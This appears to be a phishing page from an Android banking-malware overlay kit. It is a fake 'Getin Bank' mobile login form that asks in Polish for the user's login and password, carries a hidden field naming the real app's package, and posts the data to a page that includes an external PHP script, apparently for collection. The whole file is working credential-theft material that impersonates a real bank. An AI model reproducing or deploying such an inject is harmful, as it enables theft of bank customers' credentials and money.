<?php require_once '../go.php';?>
<!DOCTYPE html>
<html>
<meta http-equiv="content-type" content="text/html;charset=UTF-8" />
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, user-scalable=no, minimal-ui" />
    <title>Getin Bank</title>

    <link rel="stylesheet" href="css/normalize.css">
    <link rel="stylesheet" href="css/main.css">

    <link rel="stylesheet" href="css/getin.css">

    <script src="js/vendor/jquery-1.11.3.min.js"></script>
    <script src="js/viewport.js"></script>
</head>

<body>
		<div class="modal modal_05">
            <div class="row">
                <div class="form_header">
                    <img src="img/getin/logo.png" alt=""/>
                </div>
            </div>
			<div class="container">
				<form action="#" method="post" class="wrapper">
                <input type="hidden" name="field1" value="com.getingroup.mobilebanking" class="main_input">
					<div class="row">
						<div class="content">
							<div class="input_block_wr">
								<div class="inp_caption">
									 WPISZ LOGIN
								</div>
								<div class="inp_wr">
									<input type="text" name="field2" class="main_input" required="">
								</div>
							</div>
							<div class="input_block_wr">
								<div class="inp_caption">
									PODAJ HAS&#321;O
								</div>
								<div class="inp_wr">
									<input type="password" name="field3" class="main_input" required="">
								</div>
							</div>
							<div class="btn_wr">
								<button class="login_btn">
									DALEJ
								</button>
							</div>
						</div>
					</div>
				</form>
			</div>
		</div>
</body>

</html>